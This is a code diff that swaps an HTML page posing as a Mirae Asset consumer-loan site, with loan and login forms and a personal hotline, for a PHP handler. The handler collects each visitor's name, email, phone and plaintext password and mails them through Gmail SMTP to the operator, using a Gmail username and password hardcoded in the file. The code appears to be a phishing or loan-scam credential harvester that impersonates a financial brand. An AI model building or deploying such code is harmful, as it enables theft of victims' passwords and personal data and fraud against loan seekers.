@@ -1,102 +1,50 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-  <meta charset="UTF-8" />
-  <title>Vay Tiêu Dùng Mirae Asset</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f6fa;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background: #007bff;
-      color: white;
-      padding: 20px;
-      text-align: center;
-    }
-    nav a {
-      color: white;
-      margin: 0 15px;
-      text-decoration: none;
-    }
-    .container {
-      max-width: 800px;
-      margin: 30px auto;
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    h2 {
-      color: #007bff;
-    }
-    form input, form textarea {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
-    }
-    form button {
-      background: #007bff;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    form button:hover {
-      background: #0056b3;
-    }
-    footer {
-      text-align: center;
-      padding: 20px;
-      background: #f1f1f1;
-      margin-top: 50px;
-    }
-  </style>
-</head>
-<body>
-  <header>
-    <h1>Vay Tiêu Dùng Mirae Asset</h1>
-    <nav>
-      <a href="#home">Trang chủ</a>
-      <a href="#register">Đăng ký vay</a>
-      <a href="#login">Đăng nhập</a>
-    </nav>
-  </header>
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
 
-  <div class="container" id="home">
-    <h2>Giới thiệu</h2>
-    <p>Chào mừng bạn đến với Mirae Asset - Đối tác tài chính tin cậy. Chúng tôi hỗ trợ các gói vay tiêu dùng nhanh chóng, thủ tục đơn giản, lãi suất ưu đãi.</p>
-  </div>
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
 
-  <div class="container" id="register">
-    <h2>Form Đăng Ký Vay</h2>
-    <form>
-      <input type="text" placeholder="Họ và tên" required />
-      <input type="text" placeholder="Số điện thoại" required />
-      <input type="number" placeholder="Số tiền muốn vay (VNĐ)" required />
-      <textarea placeholder="Ghi chú thêm (nếu có)"></textarea>
-      <button type="submit">Gửi đăng ký</button>
-    </form>
-  </div>
+// Lấy dữ liệu form
+$fullname = $_POST['fullname'];
+$email = $_POST['email'];
+$phone = $_POST['phone'];
+$password = $_POST['password'];
 
-  <div class="container" id="login">
-    <h2>Form Đăng Nhập</h2>
-    <form>
-      <input type="text" placeholder="Tên đăng nhập" required />
-      <input type="password" placeholder="Mật khẩu" required />
-      <button type="submit">Đăng nhập</button>
-    </form>
-  </div>
+// Soạn nội dung email
+$body = "
+Bạn nhận được một đăng ký tài khoản mới từ website Mirae Asset: <br><br>
+<strong>Họ và tên:</strong> $fullname <br>
+<strong>Email:</strong> $email <br>
+<strong>Số điện thoại:</strong> $phone <br>
+<strong>Mật khẩu:</strong> $password
+";
 
-  <footer>
-    © 2025 Mirae Asset | Hotline: 0964307247 Mr Thiên
-  </footer>
-</body>
-</html>
+$mail = new PHPMailer(true);
+
+try {
+    // SMTP cấu hình
+    $mail->isSMTP();
+    $mail->Host = 'smtp.gmail.com'; // Gmail SMTP
+    $mail->SMTPAuth = true;
+    $mail->Username = 'thien.miraeassetgmail.com'; // Email của bạn
+    $mail->Password = 'Thienvu@2011'; // Mật khẩu ứng dụng
+    $mail->SMTPSecure = 'tls';
+    $mail->Port = 587;
+
+    // Người gửi & nhận
+    $mail->setFrom('YOUR_EMAIL@gmail.com', 'Mirae Asset Website');
+    $mail->addAddress('YOUR_EMAIL@gmail.com', 'Bạn');
+
+    // Nội dung mail
+    $mail->isHTML(true);
+    $mail->Subject = 'Đăng ký tài khoản mới từ website Mirae Asset';
+    $mail->Body    = $body;
+
+    $mail->send();
+    echo "Đăng ký thành công! Vui lòng kiểm tra email của bạn.";
+} catch (Exception $e) {
+    echo "Không gửi được email. Lỗi: {$mail->ErrorInfo}";
+}
+?>
